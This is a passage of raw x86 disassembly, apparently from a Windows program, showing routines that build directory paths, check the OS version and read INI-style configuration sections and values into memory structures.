  4029f9:	5f                   	pop    %edi
  4029fa:	5e                   	pop    %esi
  4029fb:	5b                   	pop    %ebx
  4029fc:	81 c4 30 01 00 00    	add    $0x130,%esp
  402a02:	c3                   	ret
  402a03:	90                   	nop
  402a04:	90                   	nop
  402a05:	90                   	nop
  402a06:	90                   	nop
  402a07:	90                   	nop
  402a08:	90                   	nop
  402a09:	90                   	nop
  402a0a:	90                   	nop
  402a0b:	90                   	nop
  402a0c:	90                   	nop
  402a0d:	90                   	nop
  402a0e:	90                   	nop
  402a0f:	90                   	nop
  402a10:	81 ec c0 07 00 00    	sub    $0x7c0,%esp
  402a16:	53                   	push   %ebx
  402a17:	55                   	push   %ebp
  402a18:	56                   	push   %esi
  402a19:	57                   	push   %edi
  402a1a:	8d 84 24 c0 00 00 00 	lea    0xc0(%esp),%eax
  402a21:	68 05 01 00 00       	push   $0x105
  402a26:	8b f1                	mov    %ecx,%esi
  402a28:	50                   	push   %eax
  402a29:	ff 15 d8 b0 40 00    	call   *0x40b0d8
  402a2f:	68 d8 e0 40 00       	push   $0x40e0d8
  402a34:	8d 8c 24 c4 00 00 00 	lea    0xc4(%esp),%ecx
  402a3b:	6a 5c                	push   $0x5c
  402a3d:	51                   	push   %ecx
  402a3e:	ff 15 58 b2 40 00    	call   *0x40b258
  402a44:	83 c4 08             	add    $0x8,%esp
  402a47:	40                   	inc    %eax
  402a48:	50                   	push   %eax
  402a49:	ff 15 d4 b0 40 00    	call   *0x40b0d4
  402a4f:	8b 56 14             	mov    0x14(%esi),%edx
  402a52:	8b 3d d0 b0 40 00    	mov    0x40b0d0,%edi
  402a58:	8d 84 24 c0 00 00 00 	lea    0xc0(%esp),%eax
  402a5f:	52                   	push   %edx
  402a60:	50                   	push   %eax
  402a61:	ff d7                	call   *%edi
  402a63:	8d 8c 24 c0 00 00 00 	lea    0xc0(%esp),%ecx
  402a6a:	68 94 e0 40 00       	push   $0x40e094
  402a6f:	51                   	push   %ecx
  402a70:	ff d7                	call   *%edi
  402a72:	6a 00                	push   $0x0
  402a74:	8d 94 24 cc 02 00 00 	lea    0x2cc(%esp),%edx
  402a7b:	6a 23                	push   $0x23
  402a7d:	52                   	push   %edx
  402a7e:	6a 00                	push   $0x0
  402a80:	ff 15 e4 b2 40 00    	call   *0x40b2e4
  402a86:	8d 84 24 c8 02 00 00 	lea    0x2c8(%esp),%eax
  402a8d:	68 64 e0 40 00       	push   $0x40e064
  402a92:	50                   	push   %eax
  402a93:	8d 8c 24 d0 02 00 00 	lea    0x2d0(%esp),%ecx
  402a9a:	68 5c e0 40 00       	push   $0x40e05c
  402a9f:	51                   	push   %ecx
  402aa0:	ff 15 78 b3 40 00    	call   *0x40b378
  402aa6:	83 c4 10             	add    $0x10,%esp
  402aa9:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  402aad:	8d 94 24 c0 00 00 00 	lea    0xc0(%esp),%edx
  402ab4:	8d 84 24 c8 02 00 00 	lea    0x2c8(%esp),%eax
  402abb:	51                   	push   %ecx
  402abc:	89 54 24 28          	mov    %edx,0x28(%esp)
  402ac0:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  402ac4:	c7 44 24 30 94 00 00 	movl   $0x94,0x30(%esp)
  402acb:	00 
  402acc:	ff 15 f8 b0 40 00    	call   *0x40b0f8
  402ad2:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  402ad6:	bf 02 00 00 00       	mov    $0x2,%edi
  402adb:	3b c7                	cmp    %edi,%eax
  402add:	75 0e                	jne    0x402aed
  402adf:	83 7c 24 30 05       	cmpl   $0x5,0x30(%esp)
  402ae4:	72 07                	jb     0x402aed
  402ae6:	8b ce                	mov    %esi,%ecx
  402ae8:	e8 43 fe ff ff       	call   0x402930
  402aed:	68 00 10 00 00       	push   $0x1000
  402af2:	e8 e9 7b 00 00       	call   0x40a6e0
  402af7:	8b e8                	mov    %eax,%ebp
  402af9:	8d 54 24 28          	lea    0x28(%esp),%edx
  402afd:	83 c4 04             	add    $0x4,%esp
  402b00:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  402b04:	89 54 24 10          	mov    %edx,0x10(%esp)
  402b08:	89 7c 24 18          	mov    %edi,0x18(%esp)
  402b0c:	b9 00 04 00 00       	mov    $0x400,%ecx
  402b11:	33 c0                	xor    %eax,%eax
  402b13:	8b fd                	mov    %ebp,%edi
  402b15:	f3 ab                	rep stos %eax,%es:(%edi)
  402b17:	8b 44 24 10          	mov    0x10(%esp),%eax
  402b1b:	8b 00                	mov    (%eax),%eax
  402b1d:	50                   	push   %eax
  402b1e:	68 00 10 00 00       	push   $0x1000
  402b23:	55                   	push   %ebp
  402b24:	89 44 24 28          	mov    %eax,0x28(%esp)
  402b28:	ff 15 cc b0 40 00    	call   *0x40b0cc
  402b2e:	80 7d 00 00          	cmpb   $0x0,0x0(%ebp)
  402b32:	0f 84 aa 01 00 00    	je     0x402ce2
  402b38:	55                   	push   %ebp
  402b39:	8b ce                	mov    %esi,%ecx
  402b3b:	e8 40 06 00 00       	call   0x403180
  402b40:	89 44 24 14          	mov    %eax,0x14(%esp)
  402b44:	b9 40 00 00 00       	mov    $0x40,%ecx
  402b49:	33 c0                	xor    %eax,%eax
  402b4b:	8d bc 24 c8 01 00 00 	lea    0x1c8(%esp),%edi
  402b52:	f3 ab                	rep stos %eax,%es:(%edi)
  402b54:	b9 40 00 00 00       	mov    $0x40,%ecx
  402b59:	8d bc 24 d0 04 00 00 	lea    0x4d0(%esp),%edi
  402b60:	f3 ab                	rep stos %eax,%es:(%edi)
  402b62:	b9 40 00 00 00       	mov    $0x40,%ecx
  402b67:	8d bc 24 d0 05 00 00 	lea    0x5d0(%esp),%edi
  402b6e:	f3 ab                	rep stos %eax,%es:(%edi)
  402b70:	b9 40 00 00 00       	mov    $0x40,%ecx
  402b75:	8d bc 24 d0 03 00 00 	lea    0x3d0(%esp),%edi
  402b7c:	f3 ab                	rep stos %eax,%es:(%edi)
  402b7e:	b9 40 00 00 00       	mov    $0x40,%ecx
  402b83:	8d bc 24 d0 06 00 00 	lea    0x6d0(%esp),%edi
  402b8a:	f3 ab                	rep stos %eax,%es:(%edi)
  402b8c:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402b90:	8d 94 24 c8 01 00 00 	lea    0x1c8(%esp),%edx
  402b97:	51                   	push   %ecx
  402b98:	68 00 01 00 00       	push   $0x100
  402b9d:	52                   	push   %edx
  402b9e:	50                   	push   %eax
  402b9f:	68 5c e1 40 00       	push   $0x40e15c
  402ba4:	55                   	push   %ebp
  402ba5:	ff 15 f4 b0 40 00    	call   *0x40b0f4
  402bab:	85 c0                	test   %eax,%eax
  402bad:	7e 7f                	jle    0x402c2e
  402baf:	8b 46 10             	mov    0x10(%esi),%eax
  402bb2:	33 db                	xor    %ebx,%ebx
  402bb4:	85 c0                	test   %eax,%eax
  402bb6:	7e 76                	jle    0x402c2e
  402bb8:	33 ff                	xor    %edi,%edi
  402bba:	8b 56 1c             	mov    0x1c(%esi),%edx
  402bbd:	8b c7                	mov    %edi,%eax
  402bbf:	03 c2                	add    %edx,%eax
  402bc1:	8d 8c 24 c8 01 00 00 	lea    0x1c8(%esp),%ecx
  402bc8:	50                   	push   %eax
  402bc9:	51                   	push   %ecx
  402bca:	ff 15 f0 b0 40 00    	call   *0x40b0f0
  402bd0:	85 c0                	test   %eax,%eax
  402bd2:	74 10                	je     0x402be4
  402bd4:	8b 46 10             	mov    0x10(%esi),%eax
  402bd7:	43                   	inc    %ebx
  402bd8:	81 c7 01 03 00 00    	add    $0x301,%edi
  402bde:	3b d8                	cmp    %eax,%ebx
  402be0:	7c d8                	jl     0x402bba
  402be2:	eb 4a                	jmp    0x402c2e
  402be4:	8b 56 1c             	mov    0x1c(%esi),%edx
  402be7:	8d 3c 5b             	lea    (%ebx,%ebx,2),%edi
  402bea:	c1 e7 08             	shl    $0x8,%edi
  402bed:	03 fb                	add    %ebx,%edi
  402bef:	8b 1d d4 b0 40 00    	mov    0x40b0d4,%ebx
  402bf5:	8d 8c 24 d0 04 00 00 	lea    0x4d0(%esp),%ecx
  402bfc:	8d 84 17 00 02 00 00 	lea    0x200(%edi,%edx,1),%eax
  402c03:	50                   	push   %eax
  402c04:	51                   	push   %ecx
  402c05:	ff d3                	call   *%ebx
  402c07:	8b 56 1c             	mov    0x1c(%esi),%edx
  402c0a:	8d 8c 24 d0 05 00 00 	lea    0x5d0(%esp),%ecx
  402c11:	8d 84 17 00 01 00 00 	lea    0x100(%edi,%edx,1),%eax
  402c18:	50                   	push   %eax
  402c19:	51                   	push   %ecx
  402c1a:	ff d3                	call   *%ebx
  402c1c:	8b 56 1c             	mov    0x1c(%esi),%edx
  402c1f:	c6 84 17 00 03 00 00 	movb   $0x1,0x300(%edi,%edx,1)
  402c26:	01 
  402c27:	8b 46 08             	mov    0x8(%esi),%eax
  402c2a:	40                   	inc    %eax
  402c2b:	89 46 08             	mov    %eax,0x8(%esi)
  402c2e:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  402c32:	8b 1d f4 b0 40 00    	mov    0x40b0f4,%ebx
  402c38:	57                   	push   %edi
  402c39:	8d 84 24 d4 03 00 00 	lea    0x3d4(%esp),%eax
  402c40:	68 00 01 00 00       	push   $0x100
  402c45:	50                   	push   %eax
  402c46:	6a 00                	push   $0x0
  402c48:	68 50 e1 40 00       	push   $0x40e150
  402c4d:	55                   	push   %ebp
  402c4e:	ff d3                	call   *%ebx
  402c50:	57                   	push   %edi
  402c51:	8d 8c 24 d4 06 00 00 	lea    0x6d4(%esp),%ecx
  402c58:	68 00 01 00 00       	push   $0x100
  402c5d:	51                   	push   %ecx
  402c5e:	6a 00                	push   $0x0
  402c60:	68 48 e1 40 00       	push   $0x40e148
  402c65:	55                   	push   %ebp
  402c66:	ff d3                	call   *%ebx
  402c68:	8d 94 24 d0 06 00 00 	lea    0x6d0(%esp),%edx
  402c6f:	8b ce                	mov    %esi,%ecx
  402c71:	52                   	push   %edx
  402c72:	e8 09 05 00 00       	call   0x403180
  402c77:	8b f8                	mov    %eax,%edi
  402c79:	8d 84 24 d0 04 00 00 	lea    0x4d0(%esp),%eax
  402c80:	50                   	push   %eax
  402c81:	8b ce                	mov    %esi,%ecx
  402c83:	e8 f8 04 00 00       	call   0x403180
  402c88:	8d 8c 24 d0 03 00 00 	lea    0x3d0(%esp),%ecx
  402c8f:	57                   	push   %edi
  402c90:	8d 94 24 d4 05 00 00 	lea    0x5d4(%esp),%edx
  402c97:	8b d8                	mov    %eax,%ebx
  402c99:	8b 44 24 18          	mov    0x18(%esp),%eax
  402c9d:	51                   	push   %ecx
  402c9e:	52                   	push   %edx
  402c9f:	53                   	push   %ebx
  402ca0:	8d 8c 24 d8 01 00 00 	lea    0x1d8(%esp),%ecx
  402ca7:	50                   	push   %eax
  402ca8:	51                   	push   %ecx
  402ca9:	8b ce                	mov    %esi,%ecx
  402cab:	e8 70 00 00 00       	call   0x402d20
  402cb0:	8b 54 24 14          	mov    0x14(%esp),%edx
  402cb4:	52                   	push   %edx
  402cb5:	e8 2c 7a 00 00       	call   0x40a6e6
  402cba:	53                   	push   %ebx
  402cbb:	e8 26 7a 00 00       	call   0x40a6e6
  402cc0:	57                   	push   %edi
  402cc1:	e8 20 7a 00 00       	call   0x40a6e6
  402cc6:	83 c4 0c             	add    $0xc,%esp
  402cc9:	55                   	push   %ebp
  402cca:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  402cd0:	8d 6c 28 01          	lea    0x1(%eax,%ebp,1),%ebp
  402cd4:	80 7d 00 00          	cmpb   $0x0,0x0(%ebp)
  402cd8:	0f 85 5a fe ff ff    	jne    0x402b38
  402cde:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  402ce2:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  402ce6:	8b 44 24 18          	mov    0x18(%esp),%eax
  402cea:	83 c1 04             	add    $0x4,%ecx
  402ced:	48                   	dec    %eax
  402cee:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  402cf2:	89 44 24 18          	mov    %eax,0x18(%esp)
  402cf6:	0f 85 10 fe ff ff    	jne    0x402b0c
  402cfc:	55                   	push   %ebp
  402cfd:	e8 e4 79 00 00       	call   0x40a6e6
  402d02:	83 c4 04             	add    $0x4,%esp
  402d05:	b0 01                	mov    $0x1,%al
  402d07:	5f                   	pop    %edi
  402d08:	5e                   	pop    %esi
  402d09:	5d                   	pop    %ebp
  402d0a:	5b                   	pop    %ebx
  402d0b:	81 c4 c0 07 00 00    	add    $0x7c0,%esp
  402d11:	c3                   	ret
  402d12:	90                   	nop
  402d13:	90                   	nop
  402d14:	90                   	nop
  402d15:	90                   	nop
  402d16:	90                   	nop
  402d17:	90                   	nop
  402d18:	90                   	nop
  402d19:	90                   	nop
  402d1a:	90                   	nop
  402d1b:	90                   	nop
  402d1c:	90                   	nop
  402d1d:	90                   	nop
  402d1e:	90                   	nop
  402d1f:	90                   	nop
  402d20:	51                   	push   %ecx
  402d21:	53                   	push   %ebx
  402d22:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  402d26:	55                   	push   %ebp
  402d27:	8b e9                	mov    %ecx,%ebp
  402d29:	56                   	push   %esi
  402d2a:	57                   	push   %edi
  402d2b:	8b 55 04             	mov    0x4(%ebp),%edx
  402d2e:	33 ff                	xor    %edi,%edi
  402d30:	85 d2                	test   %edx,%edx
  402d32:	89 7c 24 10          	mov    %edi,0x10(%esp)
  402d36:	7e 5d                	jle    0x402d95
  402d38:	8b 45 18             	mov    0x18(%ebp),%eax
  402d3b:	89 44 24 10          	mov    %eax,0x10(%esp)
  402d3f:	eb 04                	jmp    0x402d45
  402d41:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  402d45:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  402d49:	8b f3                	mov    %ebx,%esi
  402d4b:	8b 01                	mov    (%ecx),%eax
  402d4d:	8b 40 04             	mov    0x4(%eax),%eax
  402d50:	8a 18                	mov    (%eax),%bl
  402d52:	8a cb                	mov    %bl,%cl
  402d54:	3a 1e                	cmp    (%esi),%bl
  402d56:	75 1c                	jne    0x402d74
  402d58:	84 c9                	test   %cl,%cl
  402d5a:	74 14                	je     0x402d70
  402d5c:	8a 58 01             	mov    0x1(%eax),%bl
  402d5f:	8a cb                	mov    %bl,%cl
  402d61:	3a 5e 01             	cmp    0x1(%esi),%bl
  402d64:	75 0e                	jne    0x402d74
  402d66:	83 c0 02             	add    $0x2,%eax
  402d69:	83 c6 02             	add    $0x2,%esi
  402d6c:	84 c9                	test   %cl,%cl
  402d6e:	75 e0                	jne    0x402d50
  402d70:	33 c0                	xor    %eax,%eax
  402d72:	eb 05                	jmp    0x402d79
  402d74:	1b c0                	sbb    %eax,%eax
  402d76:	83 d8 ff             	sbb    $0xffffffff,%eax
  402d79:	85 c0                	test   %eax,%eax
  402d7b:	74 4c                	je     0x402dc9
  402d7d:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  402d81:	47                   	inc    %edi
  402d82:	83 c1 04             	add    $0x4,%ecx
  402d85:	3b fa                	cmp    %edx,%edi
  402d87:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  402d8b:	7c b4                	jl     0x402d41
  402d8d:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  402d91:	89 7c 24 10          	mov    %edi,0x10(%esp)
  402d95:	3b 55 10             	cmp    0x10(%ebp),%edx
  402d98:	0f 8d 1b 03 00 00    	jge    0x4030b9
  402d9e:	6a 1c                	push   $0x1c
  402da0:	e8 3b 79 00 00       	call   0x40a6e0
  402da5:	8b d0                	mov    %eax,%edx
  402da7:	83 c4 04             	add    $0x4,%esp
  402daa:	85 d2                	test   %edx,%edx
  402dac:	0f 84 e6 01 00 00    	je     0x402f98
  402db2:	8d 7a 04             	lea    0x4(%edx),%edi
  402db5:	b9 06 00 00 00       	mov    $0x6,%ecx
  402dba:	33 c0                	xor    %eax,%eax
  402dbc:	c7 02 68 b4 40 00    	movl   $0x40b468,(%edx)
  402dc2:	f3 ab                	rep stos %eax,%es:(%edi)
  402dc4:	e9 d1 01 00 00       	jmp    0x402f9a
  402dc9:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  402dcd:	89 7c 24 10          	mov    %edi,0x10(%esp)
  402dd1:	85 db                	test   %ebx,%ebx
  402dd3:	74 52                	je     0x402e27
  402dd5:	8b 45 18             	mov    0x18(%ebp),%eax
  402dd8:	8b 34 b8             	mov    (%eax,%edi,4),%esi
  402ddb:	8b 46 08             	mov    0x8(%esi),%eax
  402dde:	85 c0                	test   %eax,%eax
  402de0:	74 09                	je     0x402deb
  402de2:	50                   	push   %eax
  402de3:	e8 fe 78 00 00       	call   0x40a6e6
  402de8:	83 c4 04             	add    $0x4,%esp
  402deb:	8b fb                	mov    %ebx,%edi
  402ded:	83 c9 ff             	or     $0xffffffff,%ecx
  402df0:	33 c0                	xor    %eax,%eax
  402df2:	f2 ae                	repnz scas %es:(%edi),%al
  402df4:	f7 d1                	not    %ecx
  402df6:	51                   	push   %ecx
  402df7:	e8 e4 78 00 00       	call   0x40a6e0
  402dfc:	8b d0                	mov    %eax,%edx
  402dfe:	8b fb                	mov    %ebx,%edi
  402e00:	83 c9 ff             	or     $0xffffffff,%ecx
  402e03:	33 c0                	xor    %eax,%eax
  402e05:	83 c4 04             	add    $0x4,%esp
  402e08:	89 56 08             	mov    %edx,0x8(%esi)
  402e0b:	f2 ae                	repnz scas %es:(%edi),%al
  402e0d:	f7 d1                	not    %ecx
  402e0f:	2b f9                	sub    %ecx,%edi
  402e11:	8b c1                	mov    %ecx,%eax
  402e13:	8b f7                	mov    %edi,%esi
  402e15:	8b fa                	mov    %edx,%edi
  402e17:	c1 e9 02             	shr    $0x2,%ecx
  402e1a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402e1c:	8b c8                	mov    %eax,%ecx
  402e1e:	83 e1 03             	and    $0x3,%ecx
  402e21:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402e23:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402e27:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  402e2b:	85 db                	test   %ebx,%ebx
  402e2d:	74 52                	je     0x402e81
  402e2f:	8b 4d 18             	mov    0x18(%ebp),%ecx
  402e32:	8b 34 b9             	mov    (%ecx,%edi,4),%esi
  402e35:	8b 46 0c             	mov    0xc(%esi),%eax
  402e38:	85 c0                	test   %eax,%eax
  402e3a:	74 09                	je     0x402e45
  402e3c:	50                   	push   %eax
  402e3d:	e8 a4 78 00 00       	call   0x40a6e6
  402e42:	83 c4 04             	add    $0x4,%esp
  402e45:	8b fb                	mov    %ebx,%edi
  402e47:	83 c9 ff             	or     $0xffffffff,%ecx
  402e4a:	33 c0                	xor    %eax,%eax
  402e4c:	f2 ae                	repnz scas %es:(%edi),%al
  402e4e:	f7 d1                	not    %ecx
  402e50:	51                   	push   %ecx
  402e51:	e8 8a 78 00 00       	call   0x40a6e0
  402e56:	8b d0                	mov    %eax,%edx
  402e58:	8b fb                	mov    %ebx,%edi
  402e5a:	83 c9 ff             	or     $0xffffffff,%ecx
  402e5d:	33 c0                	xor    %eax,%eax
  402e5f:	83 c4 04             	add    $0x4,%esp
  402e62:	89 56 0c             	mov    %edx,0xc(%esi)
  402e65:	f2 ae                	repnz scas %es:(%edi),%al
  402e67:	f7 d1                	not    %ecx
  402e69:	2b f9                	sub    %ecx,%edi
  402e6b:	8b c1                	mov    %ecx,%eax
  402e6d:	8b f7                	mov    %edi,%esi
  402e6f:	8b fa                	mov    %edx,%edi
  402e71:	c1 e9 02             	shr    $0x2,%ecx
  402e74:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402e76:	8b c8                	mov    %eax,%ecx
  402e78:	83 e1 03             	and    $0x3,%ecx
  402e7b:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402e7d:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402e81:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  402e85:	85 db                	test   %ebx,%ebx
  402e87:	74 52                	je     0x402edb
  402e89:	8b 4d 18             	mov    0x18(%ebp),%ecx
  402e8c:	8b 34 b9             	mov    (%ecx,%edi,4),%esi
  402e8f:	8b 46 10             	mov    0x10(%esi),%eax
  402e92:	85 c0                	test   %eax,%eax
  402e94:	74 09                	je     0x402e9f
  402e96:	50                   	push   %eax
  402e97:	e8 4a 78 00 00       	call   0x40a6e6
  402e9c:	83 c4 04             	add    $0x4,%esp
  402e9f:	8b fb                	mov    %ebx,%edi
  402ea1:	83 c9 ff             	or     $0xffffffff,%ecx
  402ea4:	33 c0                	xor    %eax,%eax
  402ea6:	f2 ae                	repnz scas %es:(%edi),%al
  402ea8:	f7 d1                	not    %ecx
  402eaa:	51                   	push   %ecx
  402eab:	e8 30 78 00 00       	call   0x40a6e0
  402eb0:	8b d0                	mov    %eax,%edx
  402eb2:	8b fb                	mov    %ebx,%edi
  402eb4:	83 c9 ff             	or     $0xffffffff,%ecx
  402eb7:	33 c0                	xor    %eax,%eax
  402eb9:	83 c4 04             	add    $0x4,%esp
  402ebc:	89 56 10             	mov    %edx,0x10(%esi)
  402ebf:	f2 ae                	repnz scas %es:(%edi),%al
  402ec1:	f7 d1                	not    %ecx
  402ec3:	2b f9                	sub    %ecx,%edi
  402ec5:	8b c1                	mov    %ecx,%eax
  402ec7:	8b f7                	mov    %edi,%esi
  402ec9:	8b fa                	mov    %edx,%edi
  402ecb:	c1 e9 02             	shr    $0x2,%ecx
  402ece:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402ed0:	8b c8                	mov    %eax,%ecx
  402ed2:	83 e1 03             	and    $0x3,%ecx
  402ed5:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402ed7:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402edb:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  402edf:	85 db                	test   %ebx,%ebx
  402ee1:	74 52                	je     0x402f35
  402ee3:	8b 4d 18             	mov    0x18(%ebp),%ecx
  402ee6:	8b 34 b9             	mov    (%ecx,%edi,4),%esi
  402ee9:	8b 46 14             	mov    0x14(%esi),%eax
  402eec:	85 c0                	test   %eax,%eax
  402eee:	74 09                	je     0x402ef9
  402ef0:	50                   	push   %eax
  402ef1:	e8 f0 77 00 00       	call   0x40a6e6
  402ef6:	83 c4 04             	add    $0x4,%esp
  402ef9:	8b fb                	mov    %ebx,%edi
  402efb:	83 c9 ff             	or     $0xffffffff,%ecx
  402efe:	33 c0                	xor    %eax,%eax
  402f00:	f2 ae                	repnz scas %es:(%edi),%al
  402f02:	f7 d1                	not    %ecx
  402f04:	51                   	push   %ecx
  402f05:	e8 d6 77 00 00       	call   0x40a6e0
  402f0a:	8b d0                	mov    %eax,%edx
  402f0c:	8b fb                	mov    %ebx,%edi
  402f0e:	83 c9 ff             	or     $0xffffffff,%ecx
  402f11:	33 c0                	xor    %eax,%eax
  402f13:	83 c4 04             	add    $0x4,%esp
  402f16:	89 56 14             	mov    %edx,0x14(%esi)
  402f19:	f2 ae                	repnz scas %es:(%edi),%al
  402f1b:	f7 d1                	not    %ecx
  402f1d:	2b f9                	sub    %ecx,%edi
  402f1f:	8b c1                	mov    %ecx,%eax
  402f21:	8b f7                	mov    %edi,%esi
  402f23:	8b fa                	mov    %edx,%edi
  402f25:	c1 e9 02             	shr    $0x2,%ecx
  402f28:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402f2a:	8b c8                	mov    %eax,%ecx
  402f2c:	83 e1 03             	and    $0x3,%ecx
  402f2f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402f31:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402f35:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  402f39:	85 db                	test   %ebx,%ebx
  402f3b:	74 4e                	je     0x402f8b
  402f3d:	8b 4d 18             	mov    0x18(%ebp),%ecx
  402f40:	8b 34 b9             	mov    (%ecx,%edi,4),%esi
  402f43:	8b 46 18             	mov    0x18(%esi),%eax
  402f46:	85 c0                	test   %eax,%eax
  402f48:	74 09                	je     0x402f53
  402f4a:	50                   	push   %eax
  402f4b:	e8 96 77 00 00       	call   0x40a6e6
  402f50:	83 c4 04             	add    $0x4,%esp
  402f53:	8b fb                	mov    %ebx,%edi
  402f55:	83 c9 ff             	or     $0xffffffff,%ecx
  402f58:	33 c0                	xor    %eax,%eax
  402f5a:	f2 ae                	repnz scas %es:(%edi),%al
  402f5c:	f7 d1                	not    %ecx
  402f5e:	51                   	push   %ecx
  402f5f:	e8 7c 77 00 00       	call   0x40a6e0
  402f64:	8b d0                	mov    %eax,%edx
  402f66:	8b fb                	mov    %ebx,%edi
  402f68:	83 c9 ff             	or     $0xffffffff,%ecx
  402f6b:	33 c0                	xor    %eax,%eax
  402f6d:	83 c4 04             	add    $0x4,%esp
  402f70:	89 56 18             	mov    %edx,0x18(%esi)
  402f73:	f2 ae                	repnz scas %es:(%edi),%al
  402f75:	f7 d1                	not    %ecx
  402f77:	2b f9                	sub    %ecx,%edi
  402f79:	8b c1                	mov    %ecx,%eax
  402f7b:	8b f7                	mov    %edi,%esi
  402f7d:	8b fa                	mov    %edx,%edi
  402f7f:	c1 e9 02             	shr    $0x2,%ecx
  402f82:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402f84:	8b c8                	mov    %eax,%ecx
  402f86:	83 e1 03             	and    $0x3,%ecx
  402f89:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402f8b:	5f                   	pop    %edi
  402f8c:	5e                   	pop    %esi
  402f8d:	5d                   	pop    %ebp
  402f8e:	b8 01 00 00 00       	mov    $0x1,%eax
  402f93:	5b                   	pop    %ebx
  402f94:	59                   	pop    %ecx
  402f95:	c2 18 00             	ret    $0x18
  402f98:	33 d2                	xor    %edx,%edx
  402f9a:	8b 4d 04             	mov    0x4(%ebp),%ecx
  402f9d:	8b 45 18             	mov    0x18(%ebp),%eax
  402fa0:	85 db                	test   %ebx,%ebx
  402fa2:	89 14 88             	mov    %edx,(%eax,%ecx,4)
  402fa5:	8b 4d 04             	mov    0x4(%ebp),%ecx
  402fa8:	8b 55 18             	mov    0x18(%ebp),%edx
  402fab:	8b 34 8a             	mov    (%edx,%ecx,4),%esi
  402fae:	74 48                	je     0x402ff8
  402fb0:	8b 46 04             	mov    0x4(%esi),%eax
  402fb3:	85 c0                	test   %eax,%eax
  402fb5:	74 09                	je     0x402fc0
  402fb7:	50                   	push   %eax
  402fb8:	e8 29 77 00 00       	call   0x40a6e6
  402fbd:	83 c4 04             	add    $0x4,%esp
  402fc0:	8b fb                	mov    %ebx,%edi
  402fc2:	83 c9 ff             	or     $0xffffffff,%ecx
  402fc5:	33 c0                	xor    %eax,%eax
  402fc7:	f2 ae                	repnz scas %es:(%edi),%al
  402fc9:	f7 d1                	not    %ecx
  402fcb:	51                   	push   %ecx
  402fcc:	e8 0f 77 00 00       	call   0x40a6e0
  402fd1:	8b d0                	mov    %eax,%edx
  402fd3:	8b fb                	mov    %ebx,%edi
  402fd5:	83 c9 ff             	or     $0xffffffff,%ecx
  402fd8:	33 c0                	xor    %eax,%eax
  402fda:	83 c4 04             	add    $0x4,%esp
  402fdd:	89 56 04             	mov    %edx,0x4(%esi)
  402fe0:	f2 ae                	repnz scas %es:(%edi),%al
  402fe2:	f7 d1                	not    %ecx
  402fe4:	2b f9                	sub    %ecx,%edi
  402fe6:	8b c1                	mov    %ecx,%eax
  402fe8:	8b f7                	mov    %edi,%esi
  402fea:	8b fa                	mov    %edx,%edi
  402fec:	c1 e9 02             	shr    $0x2,%ecx
  402fef:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402ff1:	8b c8                	mov    %eax,%ecx
  402ff3:	83 e1 03             	and    $0x3,%ecx
  402ff6:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402ff8:	8b 4d 04             	mov    0x4(%ebp),%ecx
  402ffb:	8b 55 18             	mov    0x18(%ebp),%edx
  402ffe:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  403002:	8b 1c 8a             	mov    (%edx,%ecx,4),%ebx
  403005:	85 f6                	test   %esi,%esi
  403007:	74 48                	je     0x403051
  403009:	8b 43 08             	mov    0x8(%ebx),%eax
  40300c:	85 c0                	test   %eax,%eax
  40300e:	74 09                	je     0x403019
  403010:	50                   	push   %eax
  403011:	e8 d0 76 00 00       	call   0x40a6e6
  403016:	83 c4 04             	add    $0x4,%esp
  403019:	8b fe                	mov    %esi,%edi
  40301b:	83 c9 ff             	or     $0xffffffff,%ecx
  40301e:	33 c0                	xor    %eax,%eax
  403020:	f2 ae                	repnz scas %es:(%edi),%al
  403022:	f7 d1                	not    %ecx
  403024:	51                   	push   %ecx
  403025:	e8 b6 76 00 00       	call   0x40a6e0
  40302a:	8b d0                	mov    %eax,%edx
  40302c:	8b fe                	mov    %esi,%edi
  40302e:	83 c9 ff             	or     $0xffffffff,%ecx
  403031:	33 c0                	xor    %eax,%eax
  403033:	83 c4 04             	add    $0x4,%esp
  403036:	89 53 08             	mov    %edx,0x8(%ebx)
  403039:	f2 ae                	repnz scas %es:(%edi),%al
  40303b:	f7 d1                	not    %ecx
  40303d:	2b f9                	sub    %ecx,%edi
  40303f:	8b c1                	mov    %ecx,%eax
  403041:	8b f7                	mov    %edi,%esi
  403043:	8b fa                	mov    %edx,%edi
  403045:	c1 e9 02             	shr    $0x2,%ecx
  403048:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40304a:	8b c8                	mov    %eax,%ecx
  40304c:	83 e1 03             	and    $0x3,%ecx
